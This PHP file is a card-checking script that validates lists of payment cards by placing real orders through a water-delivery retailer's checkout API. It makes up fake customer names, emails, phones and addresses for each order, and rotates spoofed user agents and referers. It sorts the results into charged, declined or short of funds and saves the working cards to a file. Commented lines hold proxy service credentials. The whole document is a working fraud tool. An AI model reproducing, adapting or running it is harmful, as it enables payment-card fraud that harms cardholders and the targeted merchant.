<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: application/json');
set_time_limit(0);

ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(E_ALL);

ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/error_log.txt');

function eut($ako, $ay, $pogi)
{
  $ikawba = explode($ay, $ako);
  $ikawba = explode($pogi, $ikawba[1]);
  return $ikawba[0];
}

function usPhone()
{
  $areaCode = mt_rand(2, 9) . mt_rand(0, 9) . mt_rand(0, 9);
  $exchangeCode = mt_rand(2, 9) . mt_rand(0, 9) . mt_rand(0, 9);
  $subscriberNumber = mt_rand(1000, 9999);
  $phoneNumber = "1" . $areaCode . $exchangeCode . $subscriberNumber;

  return $phoneNumber;
}


function fname($z1 = 5)
{
  $u2 = '';
  $x3 = array("a", "e", "i", "o", "u");
  $c4 = array('b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z');
  $f5 = $z1 / 2;
  for ($y6 = 1; $y6 <= $f5; $y6++) {
    $u2 .= $c4[rand(0, 19)];
    $u2 .= $x3[rand(0, 4)];
  }
  return $u2;
}

function lname($z1 = 7)
{
  $u2 = '';
  $x3 = array("a", "e", "i", "o", "u");
  $c4 = array('b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z');
  $f5 = $z1 / 2;
  for ($y6 = 1; $y6 <= $f5; $y6++) {
    $u2 .= $c4[rand(0, 19)];
    $u2 .= $x3[rand(0, 4)];
  }
  return $u2;
}

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
  exit;
}

function formatPublicKey($key)
{
  $key = wordwrap($key, 64, "\n", true);
  return $key;
}



if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $input = file_get_contents('php://input');
  $cards = json_decode($input, true);

  if (!is_array($cards)) {
    echo json_encode(['error' => 'Invalid input']);
    exit;
  }

  $processedCards = [];

  foreach ($cards as $card) {
    $ccs = explode("|", $card);

    if (count($ccs) !== 4) {
      $processedCards[] = ['card' => $card, 'status' => 'declined', 'message' => 'CCN ONLY'];
      continue;
    }

    $cc = $ccs[0];
    $mes = $ccs[1];
    $ano = $ccs[2];
    $ano2 = substr($ano, -2);
    // $cvv = $ccs[3];

    $ii = [
      'cookie' => mt_rand() . '.txt'
    ];

    // $firstnum = $cc[0];
    // if ($firstnum == '5') {
    //   $typee = 'MC'; //VISADEBIT
    //   $typee2 = 'Mastercard';
    // }
    // if ($firstnum == '4') {
    //   $typee = 'VI'; //VISACREDIT
    //   $typee2 = 'Visa';
    // }

    $name = fname();
    $last = lname();
    $email = $name . $last . rand(111111, 999999) . '@gmail.com';
    $pass = $name . rand(11111, 99999);
    $phone = rand(11111111111, 88888888888);
    $ukpostal = chr(rand(65, 90)) . chr(rand(65, 90)) . rand(0, 9) . " " . rand(0, 9) . chr(rand(65, 90)) . chr(rand(65, 90));
    $canadapostal = chr(rand(65, 90)) . rand(0, 9) . chr(rand(65, 90)) . " " . rand(0, 9) . chr(rand(65, 90)) . rand(0, 9);
    $usPhone = usPhone();
    $d1 = getcwd();
    $d = str_replace('\\', '/', $d1);

    $userAgents = [
      // Chrome on Windows
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',

      // Chrome on macOS
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',

      // Firefox on Windows
      'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:89.0) Gecko/20100101 Firefox/89.0',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',

      // Firefox on macOS
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0',

      // Safari on iOS
      'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
      'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',

      // Chrome on Android
      'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
      'Mozilla/5.0 (Linux; Android 9; SM-N960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36',

      // Opera on Windows
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.137',

      // Edge on Windows
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.864.48 Safari/537.36 Edg/91.0.864.48'
    ];


    $referers = [
      'https://www.google.com/',
      'https://www.bing.com/',
      'https://www.yahoo.com/',
      'https://www.facebook.com/',
      'https://www.twitter.com/',
      'https://www.linkedin.com/',
      'https://www.reddit.com/',
      'https://www.amazon.com/',
      'https://www.ebay.com/',
      'https://www.netflix.com/',
      'https://www.wikipedia.org/',
      'https://www.quora.com/',
      'https://www.medium.com/',
      'https://www.alhambrawater.com/',
      'https://www.news.com/',
      'https://www.nytimes.com/',
      'https://www.washingtonpost.com/',
      'https://www.theguardian.com/',
      'https://www.bbc.com/',
      'https://www.facebook.com/',
      'https://www.instagram.com/'
    ];


    $userAgent = $userAgents[array_rand($userAgents)];
    $referer = $referers[array_rand($referers)];

    $g = curl_init();
    //curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
    //curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
    curl_setopt($g, CURLOPT_COOKIEJAR, "" . $d . "/COOKIE/" . $ii['cookie'] . "");
    curl_setopt($g, CURLOPT_COOKIEFILE, "" . $d . "/COOKIE/" . $ii['cookie'] . "");
    curl_setopt($g, CURLOPT_URL, "https://api-production.dss-aws.com/v1/carts");
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_HTTPGET, 1);
    //curl_setopt($g, CURLOPT_HEADER, 1);
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($g, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($g, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($g, CURLOPT_POSTFIELDS, '{"items":[{"itemNumber":"17535517","quantity":3}],"postalCode":"94124","branchId":749}');
    $h = array();
    $h[] = 'accept: */*';
    $h[] = 'content-type: application/json';
    $h[] = 'origin: https://www.alhambrawater.com';
    $h[] = 'referer: ' . $referer . '';
    $h[] = 'user-agent: ' . $userAgent . '';
    curl_setopt($g, CURLOPT_HTTPHEADER, $h);
    $g1 = curl_exec($g);
    $cartid = trim(eut($g1, '"id":"', '"'));
    $secretId = trim(eut($g1, '"secretId":"', '"'));


    curl_close($g);

    $g = curl_init();
    //curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
    //curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
    curl_setopt($g, CURLOPT_COOKIEJAR, "" . $d . "/COOKIE/" . $ii['cookie'] . "");
    curl_setopt($g, CURLOPT_COOKIEFILE, "" . $d . "/COOKIE/" . $ii['cookie'] . "");
    curl_setopt($g, CURLOPT_URL, 'https://api-production.dss-aws.com/v1/carts/' . $cartid . '/contact');
    curl_setopt($g, CURLOPT_CUSTOMREQUEST, "PUT");
    //curl_setopt($g, CURLOPT_HEADER, 1);
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($g, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($g, CURLOPT_SSL_VERIFYHOST, 0);


    curl_setopt($g, CURLOPT_POSTFIELDS, '{"secretId":"' . $secretId . '","email":"' . $email . '","firstName":"' . $name . '","lastName":"' . $last . '","phoneNumber":"+' . $usPhone . '"}');

    $h = array();
    $h[] = 'accept: */*';
    $h[] = 'content-type: application/json';
    $h[] = 'origin: https://www.alhambrawater.com';
    $h[] = 'referer: https://www.alhambrawater.com/';
    $h[] = 'user-agent: ' . $userAgent . '';
    curl_setopt($g, CURLOPT_HTTPHEADER, $h);
    $g2 = curl_exec($g);
    curl_close($g);

    $g = curl_init();
    //curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
    //curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
    curl_setopt($g, CURLOPT_COOKIEJAR, "" . $d . "/COOKIE/" . $ii['cookie'] . "");
    curl_setopt($g, CURLOPT_COOKIEFILE, "" . $d . "/COOKIE/" . $ii['cookie'] . "");
    curl_setopt($g, CURLOPT_URL, 'https://api-production.dss-aws.com/v1/carts/' . $cartid . '/service-addresses');
    curl_setopt($g, CURLOPT_CUSTOMREQUEST, "PUT");
    //curl_setopt($g, CURLOPT_HEADER, 1);
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($g, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($g, CURLOPT_SSL_VERIFYHOST, 0);


    curl_setopt($g, CURLOPT_POSTFIELDS, '{"servicesAddresses":[{"address1":"street ' . rand(1111, 7777) . '","city":"SAN FRANCISCO","postalCode":"94124","stateOrProvinceCode":"CA","countryCode":"US","customerType":"residential","county":"SAN FRANCISCO","cityCountyState":"SAN FRANCISCOSAN FRANCISCO","cityCountyStateDisplay":"SAN FRANCISCO, SAN FRANCISCO, CA"}],"secretId":"' . $secretId . '"}');

    $h = array();
    $h[] = 'accept: */*';
    $h[] = 'content-type: application/json';
    $h[] = 'origin: https://www.alhambrawater.com';
    $h[] = 'referer: https://www.alhambrawater.com/';
    $h[] = 'user-agent: ' . $userAgent . '';
    curl_setopt($g, CURLOPT_HTTPHEADER, $h);
    $g3 = curl_exec($g);
    curl_close($g);

    $publicKey = <<<EOD
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA8gGPMwBRPuVyJReZGIkW
H/+Bf5pnpDN1bSR2cLYLXVT8CaSnTw74qeboSnktgYCi1D9R3Bj2fYzTIwGGZb8K
inLdxwbqZmHwrE9cFhCaHbG/E0PbqQGhXP2vbniZTT4M0i0Cbi7ES3Bw5zqNbIZZ
nX041QEpxLvIyWPKZCX+fBogNMhWfCF779aclChjHkwZMsufThVWE9xklWGxXiyt
x5aL4I5JPxq0I7cAkZGGs4aF/GxWwPaq7R3wPikJQ0YHnCMfcURzl2Hnw/inqyMy
+JB6djTq2/BdzMAhWTh3cDWq9Xu+gEkb/QCd0n1yYIdKuDISlk/AfHdWe34IvzhV
yQIDAQAB
-----END PUBLIC KEY-----
EOD;


    openssl_public_encrypt($cc, $encrypted, $publicKey);

    $encryptedBase64 = base64_encode($encrypted);
    // echo "Encrypted Data: " . $encryptedBase64;

    $g = curl_init();
    //curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
    //curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
    curl_setopt($g, CURLOPT_COOKIEJAR, "" . $d . "/COOKIE/" . $ii['cookie'] . "");
    curl_setopt($g, CURLOPT_COOKIEFILE, "" . $d . "/COOKIE/" . $ii['cookie'] . "");
    curl_setopt($g, CURLOPT_URL, 'https://api-production.dss-aws.com/v1/carts/' . $cartid . '/retrieve-payment-surcharge');
    curl_setopt($g, CURLOPT_CUSTOMREQUEST, "POST");
    //curl_setopt($g, CURLOPT_HEADER, 1);
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($g, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($g, CURLOPT_SSL_VERIFYHOST, 0);


    curl_setopt($g, CURLOPT_POSTFIELDS, '{"encryptedCard":"' . $encryptedBase64 . '","stateOrProvince":"CA","optOutFlag":"N","amount":37.96,"countryCode":"US"}');

    $h = array();
    $h[] = 'accept: */*';
    $h[] = 'content-type: application/json';
    $h[] = 'origin: https://www.alhambrawater.com';
    $h[] = 'referer: https://www.alhambrawater.com/';
    $h[] = 'user-agent: ' . $userAgent . '';
    curl_setopt($g, CURLOPT_HTTPHEADER, $h);
    $g4 = curl_exec($g);
    $brand = eut($g4, '"brand":"', '",');
    curl_close($g);


    $g = curl_init();
    //curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
    //curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
    curl_setopt($g, CURLOPT_COOKIEJAR, "" . $d . "/COOKIE/" . $ii['cookie'] . "");
    curl_setopt($g, CURLOPT_COOKIEFILE, "" . $d . "/COOKIE/" . $ii['cookie'] . "");
    curl_setopt($g, CURLOPT_URL, 'https://api-production.dss-aws.com/v1/carts/' . $cartid . '/order');
    curl_setopt($g, CURLOPT_CUSTOMREQUEST, "POST");
    //curl_setopt($g, CURLOPT_HEADER, 1);
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($g, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($g, CURLOPT_SSL_VERIFYHOST, 0);


    curl_setopt($g, CURLOPT_POSTFIELDS, '{"cardholderName":"' . $name . ' ' . $last . '","expirationMonth":"' . $mes . '","expirationYear":"' . $ano2 . '","statementDeliveryMethod":"EPDF","encryptedCreditCardNumber":"' . $encryptedBase64 . '","cardType":"' . strtolower($brand) . '","deliveryDate":"2024-08-23","deliveryTime":"morning"}');

    $h = array();
    $h[] = 'accept: */*';
    $h[] = 'content-type: application/json';
    $h[] = 'origin: https://www.alhambrawater.com';
    $h[] = 'referer: https://www.alhambrawater.com/';
    $h[] = 'user-agent: ' . $userAgent . '';
    curl_setopt($g, CURLOPT_HTTPHEADER, $h);
    $g5 = curl_exec($g);
    curl_close($g);


    $msg = eut($g5, '"message":"Could not authorize payment:', '"');
    $errCode = eut($g5, '"errorCode":"', '"');

    if (strpos($msg, 'webConfirmationNumber') !== false) {
      $conft = eut($msg, '"webConfirmationNumber":"', '"');
      $processedCards[] = ['card' => $card, 'status' => 'approved', 'message' => "Charged -> ConFNum: $conft "];
      fwrite(fopen("approvedCCN.txt", "a"), $card . "\r\n");
      // print_r($processedCards);
    } elseif (strpos($msg, 'NSF') !== false) {
      $processedCards[] = ['card' => $card, 'status' => 'approved', 'message' => 'ND: DECLINED: INSUF USD 37'];
      // print_r($processedCards);
    } elseif (empty($msg)) {
      $processedCards[] = ['card' => $card, 'status' => 'Error', 'message' => 'Error in API. Check logs.'];
      // print_r($processedCards);
    } else {
      $processedCards[] = ['card' => $card, 'status' => 'declined', 'message' => "$msg"];
      // print_r($processedCards);
    }

    curl_close($g);
  }

  echo json_encode($processedCards);
}